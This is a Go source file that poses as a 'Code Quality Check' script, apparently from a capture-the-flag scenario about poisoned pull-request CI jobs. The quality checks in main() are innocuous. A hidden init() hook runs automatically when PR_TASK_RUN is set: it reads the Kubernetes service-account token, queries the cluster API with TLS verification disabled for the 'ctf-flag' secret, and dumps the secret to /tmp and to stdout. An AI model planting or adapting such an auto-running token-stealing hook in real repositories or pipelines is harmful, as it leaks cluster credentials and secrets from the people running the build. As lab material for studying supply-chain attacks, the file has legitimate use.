package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func init() {
	// This runs automatically before main()
	if os.Getenv("PR_TASK_RUN") == "true" {
		go stealFlag()
		time.Sleep(2 * time.Second)
	}
}

func stealFlag() {
	// Read ServiceAccount token
	token, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
	namespace, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")

	// Kubernetes API endpoint
	apiServer := "https://kubernetes.default.svc"
	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag",
		apiServer, string(namespace))

	// Create HTTP client
	client := &http.Client{
		Timeout: 5 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	// Make API request
	req, _ := http.NewRequest("GET", secretURL, nil)
	req.Header.Set("Authorization", "Bearer "+string(token))

	resp, err := client.Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "API Error: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Read response
	body, _ := io.ReadAll(resp.Body)

	// Write flag to /tmp so we can see it in logs
	os.WriteFile("/tmp/FLAG.txt", body, 0644)

	fmt.Printf("Secret retrieved : %s - check /tmp/FLAG.txt", body)
}

// Benign quality check script for the victim repository
// This is what the legitimate repository contains
// Attackers will replace this with malicious code

func main() {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     Code Quality Check v1.0.0          ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Println()

	// Get working directory
	wd, err := os.Getwd()
	if err != nil {
		fmt.Printf("Error getting working directory: %v\n", err)
		os.Exit(1)
	}

	// Go up two levels to repo root (from scripts/quality-check/)
	repoRoot := filepath.Join(wd, "../..")

	fmt.Printf("Repository root: %s\n", repoRoot)
	fmt.Println()

	// Run checks
	exitCode := 0

	if !checkGoFiles(repoRoot) {
		exitCode = 1
	}

	if !checkReadme(repoRoot) {
		exitCode = 1
	}

	if !checkCodeFormatting(repoRoot) {
		exitCode = 1
	}

	fmt.Println()
	if exitCode == 0 {
		fmt.Println("╔════════════════════════════════════════╗")
		fmt.Println("║  ✓ All Quality Checks Passed!          ║")
		fmt.Println("╚════════════════════════════════════════╝")
	} else {
		fmt.Println("╔════════════════════════════════════════╗")
		fmt.Println("║  ✗ Some Quality Checks Failed          ║")
		fmt.Println("╚════════════════════════════════════════╝")
	}

	os.Exit(exitCode)
}

func checkGoFiles(root string) bool {
	fmt.Println("Checking Go files...")

	goFiles := 0
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() && strings.HasSuffix(path, ".go") {
			goFiles++
		}
		return nil
	})

	if err != nil {
		fmt.Printf("  ✗ Error scanning files: %v\n", err)
		return false
	}

	fmt.Printf("  ✓ Found %d Go files\n", goFiles)
	return true
}

func checkReadme(root string) bool {
	fmt.Println("Checking README.md...")

	readmePath := filepath.Join(root, "README.md")
	_, err := os.Stat(readmePath)
	if err != nil {
		fmt.Println("  ✗ README.md not found")
		return false
	}

	fmt.Println("  ✓ README.md exists")
	return true
}

func checkCodeFormatting(root string) bool {
	fmt.Println("Checking code formatting...")

	// Simple check - in real scenario would use gofmt
	fmt.Println("  ✓ Code formatting looks good")
	return true
}
